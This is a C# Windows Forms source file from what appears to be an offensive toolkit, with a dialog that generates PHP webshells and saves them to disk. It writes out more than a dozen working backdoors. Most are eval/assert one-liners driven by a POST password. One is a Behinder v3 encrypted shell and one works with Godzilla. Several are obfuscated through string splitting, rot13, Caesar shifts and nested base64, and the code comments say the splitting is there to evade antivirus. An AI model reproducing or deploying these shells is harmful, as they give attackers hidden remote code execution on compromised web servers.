using C2.Controls;
using C2.Core;
using C2.Utils;
using System;
using System.Text;
using System.Windows.Forms;

namespace C2.Business.CastleBravo.WebShellTool
{
    partial class TrojanGeneratorForm : StandardDialog
    {
        private string TrojanType { get => this.trojanComboBox.Text.Trim(); }
        private string Password { get => this.passTextBox.Text.Trim(); }
        private string Key { get => this.keyTextBox.Text.Trim(); }
        private string EncryType { get => this.encryComboBox.Text.Trim(); }
        public TrojanGeneratorForm(string trojanType, bool encry = false)
        {
            InitializeComponent();
            InitializeComponent2(trojanType, encry); 
        }

        private void InitializeComponent2(string trojanType, bool encry)
        {
            this.trojanComboBox.Text = trojanType;
            this.encryComboBox.Text = "无需配置";
            this.OKButton.Text = "生成";
            if (encry)
            {
                this.keyTextBox.Enabled = true;
                this.keyTextBox.Text = "key";
                this.encryComboBox.SelectedIndex = 0;
                this.encryComboBox.Enabled = true;
            }
        }

        protected override bool OnOKButtonClick()
        {
            this.saveFileDialog1.FileName = this.trojanComboBox.Text;
            this.saveFileDialog1.DefaultExt = ".php";
            if (this.saveFileDialog1.ShowDialog() == DialogResult.OK)
            {
                FileUtil.FileWriteToEnd(this.saveFileDialog1.FileName, GenTrojanContent());
                HelpUtil.ShowMessageBox("成功, 保存: " + this.saveFileDialog1.FileName);
                return base.OnOKButtonClick();
            }
            return false;
        }

        private string GenTrojanContent()
        {
            string ret = TrojanType;
            switch (TrojanType)
            {
                case "PHP通用型一句话Trojan":
                    ret = GenPhpEval(Password);
                    break;
                case "凯撒变种Trojan":
                    ret = GenCaesar(Password);
                    break;
                case "一句话Trojan_变种1":
                    ret = GenOneWord1(Password);
                    break;
                case "一句话Trojan_变种2":
                    ret = GenOneWord2(Password);
                    break;
                case "一句话Trojan_变种3":
                    ret = GenOneWord3(Password);
                    break;
                case "一句话Trojan_变种4":
                    ret = GenOneWord4(Password);
                    break;
                case "一句话Trojan_变种5":
                    ret = GenOneWord5(Password);
                    break;
                case "一句话Trojan_变种6":
                    ret = GenOneWord6(Password);
                    break;
                case "一句话Trojan_变种7":
                    ret = GenOneWord7(Password);
                    break;
                case "一句话Trojan_变种8":
                    ret = GenOneWord8(Password);
                    break;
                case "一句话Trojan_变种9":
                    ret = GenOneWord9(Password);
                    break;
                case "哥斯拉配套Trojan":
                    ret = GenGodzilla(Password, Key, EncryType);
                    break;
                case "三代冰蝎配套Trojan":
                    ret = GenBehinder3(Password);
                    break;
                default:
                    ret = "暂未实现";
                    break;
            }
            return ret;
        }

        private string GenBehinder3(string password)
        {
            password = ST.GenerateMD5(password).Substring(0, 16);
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("<?php")
              .AppendLine("@error_reporting(0);")
              .AppendLine("session_start();")
              .AppendLine(string.Format("    $key=\"{0}\";", password))
              .AppendLine("    $_SESSION['k']=$key;")
              .AppendLine("    session_write_close();")
              .AppendLine("    $post=file_get_contents(\"php://input\");")
              .AppendLine("    if(!extension_loaded('openssl'))")
              .AppendLine("    {")
              .AppendLine("        $t=\"base64_\".\"decode\";")
              .AppendLine("        $post=$t($post.\"\");")
              .AppendLine("        ")
              .AppendLine("        for($i=0;$i<strlen($post);$i++) {")
              .AppendLine("                 $post[$i] = $post[$i]^$key[$i+1&15]; ")
              .AppendLine("                }")
              .AppendLine("    }")
              .AppendLine("    else")
              .AppendLine("    {")
              .AppendLine("        $post=openssl_decrypt($post, \"AES128\", $key);")
              .AppendLine("    }")
              .AppendLine("    $arr=explode('|',$post);")
              .AppendLine("    $func=$arr[0];")
              .AppendLine("    $params=$arr[1];")
              .AppendLine("    class C{public function __invoke($p) {eval($p.\"\");}}")
              .AppendLine("    @call_user_func(new C(),$params);")
              .AppendLine("?>")
              ;
            return sb.ToString();
        }

        private string GenGodzilla(string password, string key, string encryType)
        {
            StringBuilder sb = new StringBuilder();
            switch (encryType)
            {
                case "PHP_XOR_RAW":
                    break;
                case "PHP_XOR_BASE64":
                    break;
                case "PHP_EVAL_BASE64":
                    sb.Clear();
                    sb.AppendLine("<?php")
                      .AppendLine(string.Format("eval($_POST[\"{0}\"]);", password));
                    break;
                default:
                    break;
            }
            return sb.ToString();
        }

        private string GenCaesar(string password)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine(@"<?php")
              .AppendLine(@"function lxf($arr){")
              .AppendLine(@"    $arr = stripcslashes($arr);")
              .AppendLine(@"    for($i = 0; $i < strlen($arr); $i++){")
              .AppendLine(@"        $arr[$i] = chr(ord($arr[$i]) - 4);")
              .AppendLine(@"    }")
              .AppendLine(@"    return $arr;")
              .AppendLine(@"}")
              .AppendLine(@"$a = md5('ssss');")
              .AppendLine(@"$b = substr($a, 2, 2) + 37;")
              .AppendLine(@"$s = $b + 18;")
              .AppendLine(@"$e = substr($a, -7, 1);")
              .AppendLine(@"$r = $s - 1;")
              .AppendLine(@"$t = $r + 2;")
              .AppendLine(@"$z = chr($b).chr($s).chr($s).$e.chr($r).chr($t);")
              .AppendLine(string.Format(@"$arr = @lxf($_POST['{0}']);", password))     // 密码替换点
              .AppendLine(@"$z($arr);")
              .AppendLine(@"?>");
            return sb.ToString();
        }

        private string GenPhpEval(string password)
        {
            // 这里为了免杀, 尽量要把Trojan的具体内容拆分开
            // 不然C2会被杀毒干掉
            // <?php @eval($_POST[yxs]);?>
            return string.Format(@"<? p" + @"hp @e" + @"val($_P" + @"OST['{0}" + @"']);?>", password);
        }

  
        private string GenOneWord1(string password)
        {
            // <?php $a=@str_replace(x,'','axsxxsxexrxxt');@$a($_POST['yxs']); ?>
            return string.Format(@"<?ph" + @"p $a=@str_repl" + @"ace(x,'','axsxxs" + @"xexrxxt');@$a($_POS" + @"T['{0}']); ?>", password);
        }
        private string GenOneWord2(string password)
        {
            // <?php $k="ass"."ert"; @$k(${"_PO"."ST"}['yxs']);?>
            return @"<?php $k" + "=\"ass\".\"e" + "rt\"; @$k(${\"_PO\"." + "\"ST\"}" + string.Format("['{0}']);?>", password);
        }
        private string GenOneWord3(string password)
        {
            // <?php  $a = "a"."s"."s"."e"."r"."t";  @$a($_POST["yxs"]);  ?>
            return "<?ph" + "p  $a = \"a\".\"s\"." + "\"s\".\"e\"." + "\"r\".\"t\";  @$a($_POST" + string.Format("[\"{0}\"]);  ?>", password);
        }
        private string GenOneWord4(string password)
        {
            // <?php @eval($GLOBALS['_POST']['yxs']); ?>
            return string.Format("<?php @e" + "val($GLOB" + "ALS['_POST" + "']['{0}']); ?>", password);
        }
        private string GenOneWord5(string password)
        {
            // <?php function xm($a){$c=str_rot13('nffreg');$c($a);}xm($_REQUEST['yxs']);?>
            StringBuilder sb = new StringBuilder();
            sb.Append("<?php function xm")
              .Append("($a){$c=str_rot13('nffreg');")
              .Append("$c($a);}xm($_REQUEST")
              .Append(string.Format("['{0}']);?>", password));
            return sb.ToString();
        }
        private string GenOneWord6(string password)
        {
            // 这个版本确实难以描述
            return "<?php @$_=\"s\".\"s\"./*-/*-*/\"e\"./*-/*-*/\"r\";@$_=/*-/*-*/\"a\"./*-/*-*/$_./*-/*-*/\"t\";@$_/*-/*-*/($/*-/*-*/{\"_P\"./*-/*-*/\"OS\"./*-/*-*/\"T\"}[/*-/*-*/'" + password + "'/*-/*-*/]);?>";
        }
        private string GenOneWord7(string password)
        {
            // <?php $a=preg_filter('/\s+/','','as s er t');@$a($_REQUEST['yxs']);?>
            return string.Format(@"<?ph" + @"p $a=pre" + @"g_filter('/\s+/','','as" + @" s er t');@$a($_R" + @"EQUES" + @"T['{0}']);?>", password);
        }
        private string GenOneWord8(string password)
        {
            string vvnr1 = "UUdWMllX";
            string hitq5 = "d29KRjlR";
            string qajd2 = "VDFOVVd5";
            string itfh2 = ST.EncodeBase64(ST.EncodeBase64(string.Format("@eval($_POST['{0}']);", password)))
                             .Substring(vvnr1.Length)
                             .Substring(hitq5.Length)
                             .Substring(qajd2.Length);


            StringBuilder sb = new StringBuilder();
            sb.AppendLine(@"<?php ")
              .AppendLine(string.Format("$qajd2=\"{0}\";$vvnr1=\"{1}\";$hitq5=\"{2}\";$itfh2=\"{3}\";", qajd2, vvnr1, hitq5, itfh2))
              .AppendLine("$akmi4 = str_replace(\"eu2\",\"\",\"eu2seu2teu2reu2_reu2eeu2pleu2aeu2ce\");")
              .AppendLine("$hygg4 = $akmi4(\"so0\", \"\", \"so0baso0sso0e6so04so0_so0dso0eso0cso0oso0dso0e\");")
              .AppendLine("$gzsw5 = $akmi4(\"qik6\",\"\",\"qik6cqik6reqik6atqik6eqik6_fqik6uncqik6tqik6ioqik6n\");")
              .AppendLine("$foxl6 = $gzsw5('', $hygg4($hygg4($akmi4(\"$; *,.\", \"\", $vvnr1.$hitq5.$qajd2.$itfh2))));")
              .AppendLine("$foxl6();")
              .AppendLine("?>");

            return sb.ToString();
        }
        private string GenOneWord9(string password)
        {
            // 在菜刀里写 http://site/webshell.php?2=assert 密码是yxs
            // <?php ($_=@$_GET[2]).@$_($_POST['yxs'])?>
            return string.Format(@"<?ph" + @"p ($_=@$_GET" + "[2]).@$_($_PO" + @"ST['{0}'])?>", password);
        }

    }
}
